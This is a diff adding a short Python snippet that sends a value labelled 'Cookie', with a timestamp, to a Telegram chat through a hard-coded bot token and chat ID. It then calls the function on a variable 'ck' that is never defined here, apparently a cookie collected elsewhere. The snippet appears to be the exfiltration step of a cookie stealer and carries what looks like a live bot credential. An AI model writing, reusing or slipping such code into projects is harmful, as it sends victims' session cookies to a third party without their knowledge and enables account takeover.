@@ -1,0 +1,18 @@
+import requests
+from datetime import datetime
+
+bot_token = '7297665662:AAHEivNetdFGfOVKv8vBAsEnSnuQ2wuz8rQ'
+chat_id = '-1002219732972'
+
+def send_message_to_telegram(cookie):
+    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
+    message = f'Time: {datetime.now()}\nCookie: {cookie}'
+    
+    payload = {
+        'chat_id': chat_id,
+        'text': message
+    }
+    response = requests.post(url, data=payload)
+    return response.json()
+
+send_message_to_telegram(ck)
